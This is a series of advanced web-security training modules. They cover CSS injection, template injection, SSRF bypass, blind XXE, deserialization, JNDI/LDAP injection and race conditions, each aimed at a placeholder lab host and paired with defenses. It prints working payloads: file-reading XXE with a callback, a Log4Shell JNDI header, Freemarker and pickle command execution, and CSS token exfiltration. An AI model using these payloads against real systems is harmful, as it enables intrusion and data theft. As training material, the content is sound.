PRACTICE: On a local page at <LAB_HOST>, inject a harmless attribute-selector rule that requests a marker URL when a secret prefix matches.
SOURCES: None
---
## Core idea
Cascading Style Sheets are a declarative query language over the DOM. If an attacker can inject CSS rules, they can test properties of elements and report the result through a network request. Attribute selectors such as `[value^="a"]` let an attacker brute-force a CSRF token character by character: each guess that matches loads a background image from an attacker-controlled URL. This is CSS injection, and it turns read-only styling into an exfiltration channel.

UI redress, or clickjacking, is the complementary problem: an invisible frame from the target is positioned under a decoy interface so the user's clicks land on sensitive controls. Modern variants use transparent overlays, drag-and-drop, pointer events, scroll position, and frame-busting bypasses. The mental model is that the browser composes visual layers while the security decision happens on the underlying element; what the user sees and what they click can differ.

### Step-by-step method (lab only)
1. Find a CSS reflection point at <LAB_HOST>, such as a theme or style parameter.
2. Inject attribute selectors targeting a sensitive input value and a request to a marker URL on your owned collector.
3. Confirm the leak by observing which guessed character triggers a request.
4. For clickjacking, embed the target in a transparent iframe above a decoy button in your lab page.
5. Check `frame-ancestors`, `X-Frame-Options`, and cookie `SameSite` settings.

### Concrete example
```css
input[name="csrf"][value^="a"] {
  background-image: url("https://<LAB_HOST>/collect?guess=a");
}
```
Repeating for each character recovers the token without reading JavaScript variables. A clickjacking overlay:
```html
<iframe src="https://<LAB_HOST>/transfer" style="opacity:0;position:absolute"></iframe>
```

| Technique | Capability |
|---|---|
| Attribute selector | Test secret value |
| `url()` request | Exfiltrate match |
| Transparent iframe | Coerce clicks |
| Drag-and-drop | Read cross-frame text |

### Bypass and defense pairs
- Bypass: frame-busting JavaScript disabled by sandbox attributes. Defense: `Content-Security-Policy: frame-ancestors 'none'`.
- Bypass: injected style in an `style` attribute. Defense: strict `style-src` and output encoding.

### Common mistakes
- Treating CSS as harmless because it cannot execute scripts.
- Relying on `X-Frame-Options` alone when `frame-ancestors` is available.
- Forgetting that `SameSite=Lax` blocks many but not all clickjacking flows.

### Additional surface
CSS injection often begins in an unexpected place: a user-supplied color, font name, or theme parameter inserted into a style block. Even a single injectable declaration is enough to add an import or a url rule. Test both inline styles and stylesheet endpoints, and check whether sanitizers allow semicolons that terminate a declaration.

### Knowledge check
**Q:** Why can a CSS rule leak a token without JavaScript?
**A:** Because a matching selector triggers a URL request, converting a boolean DOM test into an observable network signal.

===MODULE===
TITLE: Client-Side Template Injection and Framework Escapes
LEVEL: Advanced
MINUTES: 60
SUMMARY: Explore expression evaluation in client-side frameworks and how template compilation becomes code execution.
OBJECTIVES: Detect template compilation of user input | Escape sandboxes with harmless markers | Enforce framework-safe rendering
TAKEAWAYS: A template is code, not data | Expression languages expose object graphs | Framework sandboxes are not security boundaries
PRACTICE: In a local SPA at <LAB_HOST>, submit a harmless arithmetic template payload and confirm whether the framework evaluates it.
SOURCES: None
---
## Core idea
Client-side template engines compile strings into executable expressions. If user-controlled input reaches the compiler, an attacker can evaluate arbitrary expressions in the page's context. Detection usually starts with arithmetic: `{{7*7}}` rendering as `49` indicates evaluation. From there, engine-specific object traversal can reach constructors and, in some frameworks, sandbox escapes that yield script execution. The mental model is that template compilation is a form of `eval`; the "template language" is a restricted programming language whose restrictions are often bypassable.

Different engines expose different surfaces. Angular expressions historically allowed constructor-chain escapes; Vue templates can invoke methods; Handlebars and Mustache expose helpers and prototype properties; React's `dangerouslySetInnerHTML` and Vue's `v-html` are explicit escape hatches into raw HTML. Server-side vs client-side compilation also matters: a string safely escaped on the server can still be compiled into a template on the client.

### Step-by-step method (lab only)
1. Identify the framework and version from response headers, bundles, or error pages at <LAB_HOST>.
2. Submit detection payloads such as `{{7*7}}`, `${7*7}`, and framework-specific syntax.
3. Escalate with object traversal using a harmless marker rather than a destructive payload.
4. Test escape hatches such as raw HTML bindings and trusted-by-default helpers.
5. Verify that ordinary user content is rendered through the framework's automatic escaping path.

### Concrete example
```js
const template = Handlebars.compile(location.hash.slice(1));
document.body.innerHTML = template({});
```
A payload such as `{{constructor.constructor('return 1')()}}` demonstrates expression reach. Angular-style probes like `{{'a'.constructor.prototype}}` probe the object graph.

| Engine | Probe | Escape hatch |
|---|---|---|
| Angular | `{{7*7}}` | Constructor chains |
| Vue | `{{7*7}}` | `v-html` |
| Handlebars | `{{7*7}}` | Helpers, prototype |
| React | Not templated | `dangerouslySetInnerHTML` |

### Bypass and defense pairs
- Bypass: hash or query value passed directly to `compile()`. Defense: never compile user strings; use static templates with data bindings.
- Bypass: helper that writes raw HTML. Defense: allowlist helpers and escape by default.

### Common mistakes
- Assuming server-side output encoding protects client-side compilation.
- Using outdated framework versions with known sandbox escapes.
- Confusing template injection with plain reflected XSS; the remediation differs.

### Additional surface
Do not overlook template fragments loaded asynchronously. A client route that fetches a template string from a server and compiles it locally creates the same risk as direct input. Version pinning matters because framework maintainers regularly patch sandbox escapes; an outdated bundle can turn otherwise safe data bindings into an evaluation primitive.

### Knowledge check
**Q:** Why does `{{7*7}}` evaluating to `49` prove more than a reflected XSS marker?
**A:** It proves the framework compiled the input as a template, exposing an expression language rather than passive markup.

===MODULE===
TITLE: SSRF Filter Bypass Taxonomy
LEVEL: Advanced
MINUTES: 75
SUMMARY: Organize SSRF bypasses by parser differentials, alternative encodings, redirect chains, and protocol smuggling.
OBJECTIVES: Classify SSRF bypass techniques systematically | Test parser and DNS differentials | Build an allowlist-based defense
TAKEAWAYS: Filters and HTTP clients parse URLs differently | Internal addresses have many encodings | Redirects and alternate schemes defeat naive blocks
PRACTICE: Against a local fetch endpoint at <LAB_HOST>, test decimal, octal, and IPv6 encodings of loopback plus an owned redirect chain.
SOURCES: None
---
## Core idea
Server-side request forgery filters usually deny a list of literal strings such as `127.0.0.1`, `localhost`, and the cloud metadata address. The bypass surface is enormous because the filter parses the URL with one parser while the HTTP client uses another. The mental model is a classification tree: encoding variants, DNS tricks, parser differentials, redirect chains, and protocol substitutions. Each class attacks a different assumption in the filter.

Encoding variants express the same IP as decimal, octal, hex, or IPv6-mapped forms. DNS tricks include rebinding, where an owned hostname resolves to a public IP during validation and to a private IP during the actual fetch, and wildcard DNS that resolves any subdomain. Parser differentials exploit differences in how `@`, `#`, backslashes, encoded slashes, and userinfo are handled. Redirect chains let a public URL bounce to an internal target after validation. Alternate schemes such as `gopher`, `dict`, and `file` turn a fetch into arbitrary protocol interaction.

### Step-by-step method (lab only)
1. Identify the fetch capability at <LAB_HOST> and the observable signal: response body, error text, or timing.
2. Test direct loopback and metadata addresses, then decimal, octal, hex, and IPv6 forms.
3. Use an owned domain with DNS rebinding to separate validation time from fetch time.
4. Test parser differentials with userinfo and fragment tricks.
5. Test a redirect chain from an owned public URL to an internal target.

### Concrete example
```text
http://2130706433/              decimal 127.0.0.1
http://0177.0.0.1/              octal form
http://[::ffff:127.0.0.1]/      IPv6-mapped
http://public.example@127.0.0.1/
```
The last form is parsed as host `127.0.0.1` by many clients while a naive filter reads the substring before `@`.

| Class | Example | Filter assumption |
|---|---|---|
| Encoding | Decimal IP | Literal string match |
| DNS | Rebinding | Host resolved once |
| Parser | Userinfo confusion | Same parser both sides |
| Protocol | gopher:// | Only HTTP is fetched |

### Bypass and defense pairs
- Bypass: redirect to internal address after validation. Defense: disable redirects or revalidate each hop.
- Bypass: gopher protocol against internal TCP services. Defense: allowlist schemes to HTTP(S) only.

### Common mistakes
- Blocklisting hostnames without resolving to IPs.
- Validating DNS once but fetching later with a fresh lookup.
- Ignoring non-HTTP schemes entirely.

### Knowledge check
**Q:** Why is an IP allowlist stronger than a private-range blocklist?
**A:** Because the allowlist admits only explicitly approved destinations, so encoding tricks and unknown internal ranges cannot be reached.

===MODULE===
TITLE: Blind XXE and Out-of-Band Exfiltration
LEVEL: Advanced
MINUTES: 75
SUMMARY: Learn how parameter entities turn an XML parser into an out-of-band file-read primitive when errors are not reflected.
OBJECTIVES: Detect blind XML parsing safely | Build parameter-entity exfiltration chains | Disable external entity resolution
TAKEAWAYS: Parameter entities can declare other entities | OOB channels carry stolen data in URLs | Local DTD tricks work when external DTDs are blocked
PRACTICE: In a local XML endpoint at <LAB_HOST>, send a harmless external entity that calls back to an owned collector to confirm parsing.
SOURCES: None
---
## Core idea
When an application parses attacker-supplied XML, external entity resolution can read local files or make network requests. Blind XXE is the case where the application does not reflect results, so the attacker must exfiltrate data through an out-of-band channel. Parameter entities are the key mechanism: an entity declared with `%` can be used inside a DTD to construct another declaration whose value embeds a file's content into a URL sent to an owned collector.

The mental model is a request generator. The parser resolves an external DTD from your server; that DTD defines a parameter entity that reads a local file; the file content is substituted into a URL; the parser fetches that URL, leaking the data. When external DTDs are blocked, local DTD files present on the target system can sometimes be abused to achieve the same indirection. Error-based variants place the file content into a malformed URI so the parser's error message carries it, useful when outbound network is restricted.

### Step-by-step method (lab only)
1. Detect XML parsing at <LAB_HOST> by comparing responses to well-formed and malformed input.
2. Send a harmless external entity that references a URL on an owned collector and watch for the callback.
3. Introduce parameter entities to read a non-sensitive local file in your lab.
4. Try `file://`, `netdoc://`, and error-based channels when direct HTTP fails.
5. Test local DTD indirection if external DTD loading is blocked.

### Concrete example
```xml
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % xxe SYSTEM "http://<LAB_HOST>/collect?d=%file;">
  %xxe;
]>
<root/>
```
The callback URL contains the file contents. A harmless marker file makes verification safe.

| Channel | When useful |
|---|---|
| HTTP callback | Outbound HTTP allowed |
| FTP / gopher | Protocol parsing quirks |
| Error message | No outbound network |
| Local DTD | External DTD blocked |

### Bypass and defense pairs
- Bypass: blocklist of `file://` but not `netdoc://`. Defense: disable DTDs and external entities entirely in the parser configuration.
- Bypass: tolerant parser that resolves entities despite a deny rule. Defense: use a hardened parser and validate input against a strict schema.

### Common mistakes
- Assuming "blind" means unexploitable.
- Forgetting that entity expansion can also cause denial of service.
- Testing with real third-party collectors instead of an owned lab host.

### Knowledge check
**Q:** Why are parameter entities needed for blind XXE?
**A:** Because they let an attacker build a nested declaration inside a DTD, embedding file content into a URL that the parser fetches to an attacker-controlled collector.

===MODULE===
TITLE: Server-Side Template Injection in Jinja and Twig
LEVEL: Advanced
MINUTES: 75
SUMMARY: Trace SSTI from arithmetic detection through object-graph traversal to controlled code execution in Python and PHP engines.
OBJECTIVES: Detect engine type from probes and errors | Traverse object graphs safely in a lab | Apply sandbox and compilation defenses
TAKEAWAYS: Template expressions are a programming language | Introspection leads to dangerous classes | Autoescaping does not stop expression evaluation
PRACTICE: In a local Jinja2 app at <LAB_HOST>, confirm `{{7*7}}` evaluation and enumerate a harmless attribute to map the object graph.
SOURCES: None
---
## Core idea
Server-side template injection occurs when untrusted input is concatenated into a template that the server compiles. The template expression language is a restricted but surprisingly capable programming language. Detection starts with arithmetic; escalation uses introspection to walk from a harmless literal to classes and functions. Autoescaping protects markup output but does nothing to prevent expression evaluation, which is why SSTI often escalates to remote code execution.

The mental model is a capability ladder. Level one is arithmetic confirmation. Level two is access to globals and configuration objects. Level three is object-graph traversal through `__class__`, `__mro__`, and `__subclasses__` in Python, or `_self.env` in Twig. Level four is invoking a callable that performs an action. Each rung reveals more of the runtime, and the final payload depends on which classes the application loaded.

### Step-by-step method (lab only)
1. Submit detection probes and identify the engine from syntax and error messages at <LAB_HOST>.
2. Read configuration and global objects to learn the environment.
3. Traverse the object graph using harmless introspection.
4. Locate a callable suitable for a marker action in your lab.
5. Verify the chain, then fix by removing user-controlled template compilation.

### Concrete example
```text
{{7*7}}
{{ config.items() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
```
In Twig, a classic probe is:
```text
{{_self.env.registerUndefinedFilterCallback("id")}}{{_self.env.getFilter("x")}}
```
Use only harmless commands on your own lab.

| Engine | Detection | Escalation surface |
|---|---|---|
| Jinja2 | `{{7*7}}` | `__subclasses__`, globals |
| Twig | `{{7*7}}` | `_self.env` |
| Mako | `${7*7}` | Python expressions |

### Bypass and defense pairs
- Bypass: sandbox filters that block `__class__` but allow attribute chains. Defense: never compile user templates; use fixed templates with data.
- Bypass: filters that block common function names. Defense: run the template engine in a restricted process with minimal privileges.

### Common mistakes
- Confusing template injection with simple markup injection.
- Stopping at `{{7*7}}` without assessing escalation impact.
- Assuming a sandbox is a complete security boundary.

### Additional surface
Engine version strongly influences which introspection paths exist, so record the exact version from error pages or dependency manifests. Some deployments run the engine with a security manager or restricted globals; test what remains reachable rather than assuming a public payload will work. Always escalate with harmless markers in your own lab.

### Knowledge check
**Q:** Why does autoescaping not prevent SSTI?
**A:** Because escaping applies to rendered output, while the injected expression is evaluated during compilation before any output encoding occurs.

===MODULE===
TITLE: SSTI in Java Template Engines
LEVEL: Advanced
MINUTES: 75
SUMMARY: Examine Freemarker, Velocity, and Thymeleaf expression features that enable code execution when templates are attacker-controlled.
OBJECTIVES: Detect Java template engines from syntax and errors | Use built-in reflection utilities safely in a lab | Harden template configuration
TAKEAWAYS: Java engines ship powerful reflective utilities | Preprocessing syntax creates a second evaluation stage | Sandbox modes reduce but do not remove risk
PRACTICE: In a local Freemarker endpoint at <LAB_HOST>, render a harmless template probe and confirm whether built-in utility instantiation is available.
SOURCES: None
---
## Core idea
Java template engines are designed for flexibility, and that flexibility becomes dangerous when user input is compiled as a template. Freemarker exposes a `?new()` operator that can instantiate classes available to the template, including a utility class that executes operating-system commands. Velocity allows method calls and object property access from templates. Thymeleaf supports preprocessing with `__${...}__` that creates a second evaluation pass, turning seemingly escaped input into executable expressions.

The mental model is a capability menu provided by the engine. Unlike Python engines where you assemble a chain from runtime internals, Java engines often hand you a direct utility. Detection still starts with arithmetic probes, but the error messages are distinctive: Freemarker reports invalid references, Velocity reports parsing exceptions, and Thymeleaf reveals SpEL errors. Once the engine is known, the available built-ins determine the payload.

### Step-by-step method (lab only)
1. Submit engine-specific probes to <LAB_HOST> and classify the engine from responses.
2. Determine whether the engine runs in a restricted or unrestricted configuration.
3. Enumerate built-in utilities that can instantiate or invoke classes.
4. Use a harmless marker command in your own lab to confirm execution.
5. Test Thymeleaf preprocessing by nesting expressions inside a reflected parameter.

### Concrete example
```text
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```
For Thymeleaf preprocessing:
```text
__${7*7}__
```
If the result is `49`, the preprocessing stage is active and a second evaluation occurs.

| Engine | Probe | Powerful feature |
|---|---|---|
| Freemarker | `${7*7}` | `?new()` instantiation |
| Velocity | `#set($x=7*7)` | Method invocation |
| Thymeleaf | `__${7*7}__` | Preprocessing |

### Bypass and defense pairs
- Bypass: class allowlists that still permit a utility class. Defense: never compile user-supplied templates; use fixed templates with model data.
- Bypass: preprocessing that re-evaluates escaped text. Defense: disable preprocessing and avoid reflecting input into templates.

### Common mistakes
- Treating engine sandbox mode as a complete control.
- Ignoring preprocessing as a separate evaluation stage.
- Testing payloads from public write-ups without adapting to the lab environment.

### Additional surface
Template configuration matters as much as version. A restricted Freemarker configuration removes object instantiation, while an unrestricted one leaves the new-operator available. Thymeleaf preprocessing can be disabled, and framework integrations may expose expression objects that widen the attack surface. Record which mode the lab application uses.

### Knowledge check
**Q:** Why is Freemarker's `?new()` especially dangerous?
**A:** Because it allows template code to instantiate arbitrary classes on the classpath, including utilities that execute commands.

===MODULE===
TITLE: Java Deserialization Gadget Chains
LEVEL: Advanced
MINUTES: 90
SUMMARY: Understand how native Java deserialization turns byte streams into object graphs whose readObject methods form execution chains.
OBJECTIVES: Recognize serialized Java artifacts | Map a gadget chain from source to sink | Enforce deserialization filters
TAKEAWAYS: Deserialization invokes attacker-controlled code paths by design | Gadget chains reuse classes already on the classpath | Filters are the primary mitigation
PRACTICE: In a local Java service at <LAB_HOST>, submit a Base64-encoded serialized object and observe a harmless marker effect in your own lab.
SOURCES: None
---
## Core idea
Java native deserialization reconstructs objects from a byte stream and calls their `readObject` methods. If the stream is attacker-controlled, the classes chosen by the attacker determine which code runs during reconstruction. A gadget chain is a program assembled from existing classes: each class's deserialization callback triggers a method on another object, ending in a dangerous sink such as command execution or JNDI lookup. Libraries such as CommonsCollections and BeanShell have historically supplied the needed classes.

The mental model is a domino chain where each domino is a class already present on the classpath. The serialized stream sets the initial domino and the values it carries. Some chains rely on secondary lookups, such as a JNDI reference fetched during deserialization, which connects this topic to remote class loading. Because the chain depends on library versions, identifying the classpath from error messages is a core skill.

### Step-by-step method (lab only)
1. Detect serialized Java data at <LAB_HOST> by looking for the stream magic bytes or Base64-wrapped equivalents.
2. Trigger controlled errors to enumerate class names and library versions.
3. Match available libraries to known chain structures.
4. Generate a harmless marker payload in your own lab environment.
5. Verify the effect, then implement a deserialization filter that allows only expected classes.

### Concrete example
```text
AC ED 00 05 73 72 00 ...   (serialized Java stream)
```
A Base64-wrapped equivalent is common in HTTP headers and cookies. Chains are typically described by their entry class and trigger class; for example, a transform map whose lazy evaluation calls a command transformer.

| Chain component | Role |
|---|---|
| Entry object | Starts callbacks |
| Transformer | Holds action |
| Trigger map | Invokes action |
| Sink | Executes effect |

### Bypass and defense pairs
- Bypass: filter that allows a broad package containing a gadget class. Defense: allowlist exact classes required by the application.
- Bypass: primitive chains using only JDK classes. Defense: keep JDK patched and apply JEP 290 filters globally.

### Common mistakes
- Assuming blocking one library eliminates the issue.
- Ignoring secondary vectors such as JNDI or RMI during deserialization.
- Using destructive payloads instead of harmless markers in a lab.

### Knowledge check
**Q:** Why do gadget chains work without uploading any code?
**A:** Because they reuse classes already loaded by the application, arranging existing callbacks into a program.

===MODULE===
TITLE: JNDI and LDAP Injection Edge Cases
LEVEL: Advanced
MINUTES: 75
SUMMARY: Study attacker-controlled lookup names that retrieve remote objects, plus filter injection in LDAP queries.
OBJECTIVES: Identify JNDI lookup sinks in loggers and configuration | Build a harmless callback proof | Escape LDAP filter metacharacters
TAKEAWAYS: A lookup name is an instruction to fetch an object | LDAP references can point to remote codebases | Filter syntax injection broadens queries
PRACTICE: In a local app at <LAB_HOST>, send a harmless JNDI marker in a header and observe a callback to an owned LDAP listener.
SOURCES: None
---
## Core idea
JNDI is a naming and directory API: given a name, it returns an object. When the name is attacker-controlled, the lookup becomes a request to a directory service. LDAP and RMI providers can return a `Reference` that instructs the client to load a class from a remote codebase, which is the mechanism behind the well-known Log4Shell vulnerability. Even without code loading, the lookup itself is an SSRF-like primitive against internal directory services.

LDAP injection is a separate but related class. LDAP filters use a prefix notation with parentheses and operators; unescaped user input can close a filter and append a new condition, broadening search results or bypassing authentication checks. DN injection manipulates distinguished names with commas and escapes. The mental model is that query syntax is part of the input language; if user data is concatenated into that language, it becomes instructions.

### Step-by-step method (lab only)
1. Identify sinks at <LAB_HOST> that pass user input to loggers, message formats, or directory lookups.
2. Send a harmless marker such as `${jndi:ldap://<LAB_HOST>/probe}` in a header and watch an owned listener.
3. Use a controlled LDAP server to observe which attributes and references are requested.
4. For LDAP filters, inject characters like `)(&` and `|` and compare result sets.
5. Test DN fields with comma and escape injection.

### Concrete example
```http
User-Agent: ${jndi:ldap://<LAB_HOST>/probe}
```
A vulnerable logger performs a lookup and connects to your listener. For a filter:
```text
(&(uid=<INPUT>)(objectClass=person))
```
Input of `*)(uid=*))(|(uid=*` turns the query into a wildcard match.

| Surface | Input | Effect |
|---|---|---|
| JNDI name | `ldap://` | Remote lookup |
| LDAP filter | `)(` | Query broadening |
| DN | `,` | Attribute injection |

### Bypass and defense pairs
- Bypass: nested lookup syntax that evades a simple string filter. Defense: disable message lookups and upgrade affected libraries.
- Bypass: filter metacharacters encoded differently by the client. Defense: escape LDAP special characters using a vetted encoder.

### Common mistakes
- Assuming only servlet containers are affected; many libraries perform lookups.
- Ignoring outbound connections to internal directory services.
- Testing against systems outside your owned lab.

### Additional surface
Remember that JNDI lookups are not the only risk from directory interactions. An application that binds or modifies directory entries may be vulnerable to attribute injection, where attacker-controlled values alter group membership or access flags. Test write paths with harmless marker attributes in your own lab.

### Knowledge check
**Q:** Why can an LDAP response lead to code execution?
**A:** Because a directory can return a Reference with a remote codebase URL; the JNDI client may load and instantiate that class.
===MODULE===
TITLE: Template Injection in Modern Stacks
LEVEL: Advanced
MINUTES: 60
SUMMARY: Compare Go templates, Handlebars, and Mustache behavior when user input reaches template compilation.
OBJECTIVES: Distinguish autoescaping from expression evaluation | Detect modern-template injection | Restrict template functions
TAKEAWAYS: html/template and text/template differ sharply | Helpers and partials are execution surfaces | Autoescaping does not block evaluation
PRACTICE: In a local Go service at <LAB_HOST>, submit a harmless arithmetic probe to see whether input is compiled as a template.
SOURCES: None
---
## Core idea
Modern stacks often assume that template engines are safe because they autoescape. That assumption confuses two separate properties: output escaping protects markup, while template compilation evaluates expressions. Go illustrates the distinction well: `html/template` applies context-aware escaping to rendered values, whereas `text/template` performs no escaping at all. If user input is compiled as the template itself, both engines will evaluate template actions such as method calls, pipelines, and inclusions.

The mental model is a capability set supplied by the engine. Go templates expose methods on the data object, built-in functions, and the `template` action for inclusion. Handlebars and Mustache expose helpers and partials, which can be dangerous if helpers perform IO or if prototype properties are reachable. Third-party function libraries such as Sprig add environment and command functions that turn an injection into a direct primitive. The engine's sandbox, if any, is a policy layer, not a security boundary.

### Step-by-step method (lab only)
1. Submit detection probes to <LAB_HOST> and classify the engine from syntax and error messages.
2. Determine which template package or helper library is in use and list available functions.
3. Test context-aware escaping by injecting values into HTML, attribute, and URL contexts separately.
4. Probe method calls on supplied data objects using harmless markers.
5. Verify whether user input can be compiled as a template at all; if not, the issue is likely ordinary injection.

### Concrete example
```gotemplate
{{.User.Name}}
{{printf "%s" .Value}}
{{template "header" .}}
```
If an attacker controls the template string, a function such as `{{env "HOME"}}` from a function library reveals environment data. With Handlebars:
```text
{{#with this}}{{constructor.name}}{{/with}}
```
probes prototype reachability.

| Engine | Escaping | Execution surface |
|---|---|---|
| Go html/template | Context-aware | Methods, functions |
| Go text/template | None | Methods, functions |
| Handlebars | HTML escaping | Helpers, partials |
| Mustache | HTML escaping | Sections, lambdas |

### Bypass and defense pairs
- Bypass: escaped input that is later compiled as a template. Defense: keep templates static and pass user data only as values.
- Bypass: a helper that writes raw HTML. Defense: allowlist helpers and forbid user-defined helpers.

### Additional surface
Template inclusion is frequently overlooked: a parameter that selects a template by name can sometimes traverse to unintended files. Validate template names against a strict allowlist. Also record the exact engine version, because function libraries evolve and older releases may expose dangerous built-ins that newer ones removed.

### Common mistakes
- Assuming autoescaping prevents expression evaluation.
- Using text/template where html/template was intended.
- Allowing user-selected template names.

### Knowledge check
**Q:** Why is html/template still unsafe if user input is compiled as the template?
**A:** Because escaping applies to interpolated values, not to template actions that the compiler parses and executes.

===MODULE===
TITLE: Deserialization Gadgets in PHP, Python, and .NET
LEVEL: Advanced
MINUTES: 90
SUMMARY: Survey runtime-specific deserialization formats and the gadget primitives they expose across common server stacks.
OBJECTIVES: Recognize serialized formats per runtime | Map a gadget to an observable effect | Replace unsafe deserializers
TAKEAWAYS: Each runtime has a dangerous-by-design deserializer | Gadgets assemble existing code | Magic methods initiate chains
PRACTICE: In a local Python service at <LAB_HOST>, deserialize a harmless marker pickle in your own lab and confirm the effect.
SOURCES: None
---
## Core idea
Native deserialization formats are dangerous because reconstruction itself invokes code. PHP's `unserialize()` calls magic methods such as `__wakeup` and `__destruct`, enabling property-oriented programming chains that end in file writes or command execution. Python's `pickle` is a stack machine whose `REDUCE` opcode can call arbitrary callables. .NET's `BinaryFormatter` reconstructs object graphs with type resolvers that can be abused. Node's `node-serialize` IIFE pattern is a smaller but similar example.

The mental model is format-specific: identify the serialized dialect, then determine which classes are available and which magic method or opcode provides the first effect. PHP chains are described by entry and termination classes; Python payloads are short opcode sequences; .NET chains depend heavily on available assemblies. Unlike Java, some of these formats let the payload directly name a function, which lowers the bar but also makes detection easier through pattern matching.

### Step-by-step method (lab only)
1. Identify serialized data at <LAB_HOST> from its shape: PHP object markers, pickle opcodes, or binary headers.
2. Confirm the deserialization point through a controlled error or timing signal.
3. Enumerate available classes and functions through errors or a debug endpoint in your lab.
4. Construct a harmless marker payload appropriate to the runtime.
5. Verify the effect and replace the deserializer with a safe format such as JSON.

### Concrete example
```python
pickle.loads(base64.b64decode(data))
# minimal marker payload concept:
# b"cos\nsystem\n(S'id'\ntR."
```
PHP object form:
```text
O:8:"Example":1:{s:4:"file";s:9:"/tmp/mark";}
```
Both use the application's own trust in reconstructed objects.

| Runtime | Format | Entry point |
|---|---|---|
| PHP | `O:` object notation | `__wakeup`/`__destruct` |
| Python | Pickle opcodes | `REDUCE` |
| .NET | BinaryFormatter | Type resolvers |
| Node | node-serialize | IIFE wrapper |

### Bypass and defense pairs
- Bypass: a filter that blocks the word `system` but allows another callable. Defense: avoid native deserialization of untrusted data entirely.
- Bypass: signed-looking data whose signature is not actually verified. Defense: verify signatures before deserialization and use authenticated encryption.

### Additional surface
Magic methods can trigger on garbage collection, not only during deserialization, so a chain may fire after the request appears complete. This makes impact easy to miss in logs. Focus detection on the deserialization boundary and on surprising outbound connections from the application process.

### Common mistakes
- Treating Base64 encoding as protection.
- Assuming JSON-based transports eliminate the risk when a field is later deserialized.
- Using destructive proof payloads outside a dedicated lab.

### Knowledge check
**Q:** Why can a PHP deserialization chain fire after the request finishes?
**A:** Because destructor magic methods run during garbage collection, which may occur after the response is sent.

===MODULE===
TITLE: Business Limit Overruns and Constraint Confusion
LEVEL: Advanced
MINUTES: 60
SUMMARY: Study how numeric and structural business limits are bypassed when validation and enforcement use different representations.
OBJECTIVES: Inventory business constraints and their enforcement points | Test boundary and encoding variants | Enforce limits atomically
TAKEAWAYS: Limits are invariants, not suggestions | Client-side limits are not controls | Validation and enforcement must use one representation
PRACTICE: Against a local ordering API at <LAB_HOST>, test boundary quantities, duplicate fields, and oversized item arrays with harmless values.
SOURCES: None
---
## Core idea
Applications express business limits as numbers: maximum quantity, minimum price, maximum items, retry counts, and balance ceilings. Bugs appear when the value that is validated is not the value that is used. A front-end may cap quantity at 10 while the API accepts 10000; a validator may inspect the first occurrence of a duplicate JSON key while the parser keeps the last; a limit may be applied per request while the attacker splits an order across many requests.

The mental model is an invariant that must hold at the authoritative moment of use. Any earlier check is advisory. The gap usually comes from representation changes: string to integer, decimal to float, array to count, or encoded to decoded form. Units are another source: a limit in cents may be compared against a value supplied in dollars.

### Step-by-step method (lab only)
1. Inventory every limit at <LAB_HOST> and record where it is enforced.
2. Test boundary values just inside and outside the limit.
3. Test alternate representations: strings, exponent notation, duplicate keys, and arrays.
4. Test splitting a single logical operation across multiple requests.
5. Confirm the final persisted effect rather than trusting the API response.

### Concrete example
```json
{"itemId":"SKU1","quantity":"1e3"}
{"itemId":"SKU1","quantity":1,"quantity":10000}
{"items":["SKU1","SKU1","SKU1"]}
```
If the validator reads the first `quantity` and the order service reads the last, the limit is bypassed. Similarly, a 1000-item array may pass a per-item check while violating a total-count constraint.

| Limit | Weak enforcement | Strong enforcement |
|---|---|---|
| Quantity | Front-end max | Recheck at commit |
| Amount | Float comparison | Integer minor units |
| Item count | Per-request | Per-order aggregate |

### Bypass and defense pairs
- Bypass: exponent notation parsed as a number late. Defense: parse once into a strongly typed value and validate that value.
- Bypass: duplicate JSON keys. Defense: reject documents with duplicate keys.

### Additional surface
Time-based limits deserve the same treatment: a "one per day" rule that records the check time rather than the completion time can be raced. Currency and unit confusion across microservices is another frequent source of overruns; make the unit explicit in the data model rather than in comments.

### Common mistakes
- Trusting the response's success flag as proof the limit held.
- Validating a decoded value but persisting the raw value.
- Ignoring aggregate limits across related records.

### Knowledge check
**Q:** Why is client-side validation not a security control for limits?
**A:** Because an attacker controls the client and can send any request directly to the API, bypassing the validation entirely.

===MODULE===
TITLE: Time-of-Check to Time-of-Use Race Conditions
LEVEL: Advanced
MINUTES: 75
SUMMARY: Learn to find and exploit split check-then-act sequences in web applications using controlled concurrency.
OBJECTIVES: Identify TOCTOU pairs in code paths | Build a safe concurrent lab test | Apply atomic mitigations
TAKEAWAYS: A gap between check and use is a race window | Concurrency turns tiny windows into reliable exploits | Atomic operations remove the window
PRACTICE: In a local coupon lab at <LAB_HOST>, fire two parallel redemption requests and count how many succeed against a single-use code.
SOURCES: None
---
## Core idea
A time-of-check to time-of-use race occurs when a program validates a condition and then performs an action based on it, using state that can change between the two steps. Web applications create these windows constantly: check inventory then decrement, check coupon unused then mark used, check balance then transfer, check path then open file. The mental model is a split decision: the check observes a snapshot, while the use acts on live state. Any attacker who can interleave requests between the steps acts on stale information.

Unlike memory-corruption races, web races are usually logical and highly reproducible. The window is often milliseconds, which is plenty when you issue many parallel requests. Reliability improves when you find a deliberately slow step between check and use, such as an external call or a large computation. Impact ranges from limit overruns to double spending and authorization bypass.

### Step-by-step method (lab only)
1. At <LAB_HOST>, find check-then-act pairs by reading code or by observing state changes across steps.
2. Identify mutable state shared between the check and the use.
3. Synchronize parallel requests so they arrive together, using a barrier in your lab harness.
4. Measure how many operations succeed versus the intended limit.
5. Repeat with small timing offsets to confirm the window and its boundary.

### Concrete example
```http
POST /coupon/redeem HTTP/1.1
Host: <LAB_HOST>
Content-Type: application/json

{"code":"SINGLE-USE"}
```
Two parallel requests may both observe `used=false` before either writes `used=true`. If both then complete the discount, the invariant is violated.

| Pattern | Race window | Consequence |
|---|---|---|
| Check balance, then debit | Between read and write | Double spend |
| Check code, then redeem | Between read and write | Reuse |
| Check path, then open | Between stat and open | File swap |

### Bypass and defense pairs
- Bypass: many parallel requests with slightly staggered timing. Defense: perform check and mutation in one atomic database transaction with row locks.
- Bypass: a slow external call inside the window. Defense: move validation after the slow step or reserve state before it.

### Additional surface
Not every concurrency bug is a classic TOCTOU. Some are "last write wins" overwrites where two legitimate updates collide and one is lost. Test both success counts and final state values, since a system can report two successes while persisting only one change, or report one success while applying both effects.

### Common mistakes
- Assuming a single-threaded language eliminates races; the database is still shared.
- Testing sequentially and concluding the system is safe.
- Ignoring retries, which multiply the number of operations.

### Knowledge check
